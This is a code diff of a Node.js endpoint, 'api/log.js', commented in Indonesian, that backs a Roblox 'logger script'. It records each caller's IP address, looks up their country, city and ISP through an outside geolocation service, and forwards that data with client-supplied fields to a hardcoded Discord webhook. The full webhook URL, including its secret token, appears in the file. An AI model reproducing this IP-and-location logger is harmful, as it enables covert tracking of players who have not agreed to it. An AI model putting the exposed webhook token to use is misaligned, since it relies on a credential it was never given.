@@ -1,43 +1,14 @@
 // api/log.js
 const https = require('https');
 
-// ==========================================
-// WEBHOOK DISCORD (HANYA SATU, HANYA DI SINI)
-// ==========================================
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-// ==========================================
-// FUNGSI KIRIM KE DISCORD
-// ==========================================
-async function sendToDiscord(embedData) {
-    const payload = JSON.stringify({ embeds: [embedData] });
-    const url = new URL(DISCORD_WEBHOOK);
-    const options = {
-        hostname: url.hostname,
-        path: url.pathname,
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' }
-    };
-    
-    return new Promise((resolve) => {
-        const req = https.request(options, (res) => {
-            res.resume();
-            resolve(res.statusCode === 204 || res.statusCode === 200);
-        });
-        req.on('error', () => resolve(false));
-        req.write(payload);
-        req.end();
-    });
-}
-
-// ==========================================
-// FUNGSI AMBIL GEOLOKASI DARI IP
-// ==========================================
 async function getGeoInfo(ip) {
     return new Promise((resolve) => {
+        const url = `https://ipwhois.io/json/${ip}`;
         const timeout = setTimeout(() => resolve(null), 5000);
         
-        https.get(`https://ipwhois.io/json/${ip}`, (geoRes) => {
+        https.get(url, (geoRes) => {
             let data = '';
             geoRes.on('data', chunk => data += chunk);
             geoRes.on('end', () => {
@@ -64,43 +35,52 @@ async function getGeoInfo(ip) {
     });
 }
 
-// ==========================================
-// HANDLER UTAMA
-// ==========================================
 module.exports = async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
     
     if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method Not Allowed' });
+        return res.status(405).json({ Ndraawz: 'Not Allowed' });
     }
-    
+
     let body = '';
     await new Promise((resolve) => {
         req.on('data', chunk => body += chunk);
         req.on('end', resolve);
     });
-    
+
     const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
     const cleanIp = clientIp.replace('::ffff:', '');
-    
+
     try {
         const data = JSON.parse(body);
         
-        // ========== LOG TYPE: SECURITY (dari testing.js) ==========
+        // Kalau dari testing.js (security log)
         if (data.type === "security") {
             const embed = {
                 title: "❗️ Ndraawz Security ❗️",
                 description: data.message,
                 color: 0xff0000,
-                footer: { text: "IP: " + cleanIp },
                 timestamp: new Date().toISOString()
             };
-            await sendToDiscord(embed);
-            console.log(`✅ Security log terkirim untuk IP: ${cleanIp}`);
-            return res.status(200).json({ ok: true });
+            const payload = JSON.stringify({ embeds: [embed] });
+            const url = new URL(DISCORD_WEBHOOK);
+            const options = {
+                hostname: url.hostname,
+                path: url.pathname,
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            };
+            const discordReq = https.request(options, (discordRes) => {
+                discordRes.resume();
+                res.status(200).json({ ok: true });
+            });
+            discordReq.on('error', () => res.status(200).json({ ok: false }));
+            discordReq.write(payload);
+            discordReq.end();
+            return;
         }
         
-        // ========== LOG TYPE: PLAYER (dari client Roblox) ==========
+        // Kalau dari logger script (player log)
         if (data.type === "player" && data.fields) {
             const geoData = await getGeoInfo(cleanIp) || {
                 country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
@@ -122,12 +102,26 @@ module.exports = async function handler(req, res) {
                 fields: allFields,
                 timestamp: new Date().toISOString()
             };
-            await sendToDiscord(embed);
-            console.log(`✅ Player log terkirim untuk IP: ${cleanIp}`);
-            return res.status(200).json({ ok: true });
+            
+            const payload = JSON.stringify({ embeds: [embed] });
+            const url = new URL(DISCORD_WEBHOOK);
+            const options = {
+                hostname: url.hostname,
+                path: url.pathname,
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            };
+            const discordReq = https.request(options, (discordRes) => {
+                discordRes.resume();
+                res.status(200).json({ ok: true });
+            });
+            discordReq.on('error', () => res.status(200).json({ ok: false }));
+            discordReq.write(payload);
+            discordReq.end();
+            return;
         }
         
-        // ========== LOG TYPE: DEFAULT (tanpa type, untuk backward compatibility) ==========
+        // Fallback untuk format lama (tanpa type)
         if (data.fields) {
             const geoData = await getGeoInfo(cleanIp) || {
                 country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
@@ -149,15 +143,28 @@ module.exports = async function handler(req, res) {
                 fields: allFields,
                 timestamp: new Date().toISOString()
             };
-            await sendToDiscord(embed);
-            console.log(`✅ Default log terkirim untuk IP: ${cleanIp}`);
-            return res.status(200).json({ ok: true });
+            
+            const payload = JSON.stringify({ embeds: [embed] });
+            const url = new URL(DISCORD_WEBHOOK);
+            const options = {
+                hostname: url.hostname,
+                path: url.pathname,
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            };
+            const discordReq = https.request(options, (discordRes) => {
+                discordRes.resume();
+                res.status(200).json({ ok: true });
+            });
+            discordReq.on('error', () => res.status(200).json({ ok: false }));
+            discordReq.write(payload);
+            discordReq.end();
+            return;
         }
         
-        return res.status(400).json({ error: "Invalid request format" });
+        res.status(400).json({ error: "Invalid request format" });
         
     } catch (err) {
-        console.error("Error:", err);
-        return res.status(400).json({ error: err.message });
+        res.status(400).json({ error: err.message });
     }
 };
